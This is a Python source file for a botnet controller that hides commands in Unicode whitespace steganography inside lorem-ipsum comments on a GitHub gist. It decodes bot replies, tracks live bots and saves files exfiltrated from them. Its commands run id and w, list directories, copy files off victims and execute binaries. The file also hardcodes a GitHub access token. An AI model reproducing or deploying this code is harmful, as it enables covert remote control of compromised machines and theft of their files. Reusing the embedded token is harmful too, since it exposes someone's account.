import threading
import time
from github import Github
import pyUnicodeSteganography as usteg
import lorem

print(f"Hello, welcome to the bot controller. Possible commands are:\n\
    w - get listing of currently logged users\n \
    ls <path> - get a listing of a paritcular directory\n \
    id - get id of current user\n \
    cp <full_path_to_the_file> - copy a file from bot to the controller\n \
    ex <full_path_to_the_binary>\n\n")

g = Github("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")
gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
no_comments = gist.comments
no_comments = 0
no_of_online_bots = 0
list_of_online_bots = {}


# secret_msg = "BOT DATA obr.png"
# text = "text with instructions in text and a binary image"

# encoded = usteg.encode(text, secret_msg)
# text = encoded

# with open('test.png', 'rb') as f:
#     data = f.read()
#     enc = usteg.encode(text, data, binary=True, method='snow')

# gist.create_comment(enc)

# comments = gist.get_comments()

# dc = usteg.decode(comments[1].body, method='snow', binary=True)

# instr = usteg.decode(comments[3].body, method='snow')
# print(instr.strip())

# print(instr)

# with open('out.png', 'wb') as f:
#     f.write(dc)

# for ch in encoded:
#     print(ch.encode('utf-8'))

exit(0)
def send_command(args):
    if args[0] == "w":
        command = "CONTROL w"
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "ls" and len(args) > 1:
        command = "CONTROL ls " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "id":
        command = "CONTROL id"
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "cp" and len(args) > 1:
        command = "CONTROL cp " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    elif args[0] == "ex" and len(args) > 1:
        command = "CONTROL ex " + args[1]
        command_enc = usteg.encode(lorem.sentence(), command, method='snow')
        gist.create_comment(command_enc)
    else:
        print("Sorry unknown command or incorrect number of arguments")


def process_response(r):
    data = r.body
    response_metadata = usteg.decode(data).split()

    if len(response_metadata) < 1:
        return

    if response_metadata[0] != "BOT":
        return

    if response_metadata[1] == "TEXT":
        print(usteg.decode(data, method='snow'))
    elif response_metadata[1] == "PING":
        botname = response_metadata[2].strip()
        list_of_online_bots[botname] = 5
        print("PING from", botname)
    elif response_metadata[1] == "DATA":
        filename = response_metadata[2]
        decoded_binary = usteg.decode(data, method='snow', binary=True)
        with open(filename, 'wb') as f:
            f.write(decoded_binary)
        print("FILE", filename, "was saved")


def get_responses():
    global no_comments
    gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
    no_msgs_to_process = gist.comments - no_comments
    no_comments = gist.comments

    for k in list_of_online_bots:
        list_of_online_bots[k] -= 1

    i = 0
    for c in gist.get_comments().reversed:
        if i == no_msgs_to_process:
            break
        process_response(c)
        i += 1

    # removing dead bots
    toDelete = []
    for k in list_of_online_bots:
        if int(list_of_online_bots[k]) <= 0:
            print("\nBot", k, "is dead")
            toDelete.append(k)
    for k in toDelete:
        list_of_online_bots.pop(k)

    threading.Timer(2, get_responses).start()


get_responses()

while True:
    command = input("Enter command: ")
    if len(command) > 0:
        send_command(command.split())
    else:
        print("No command supplied")
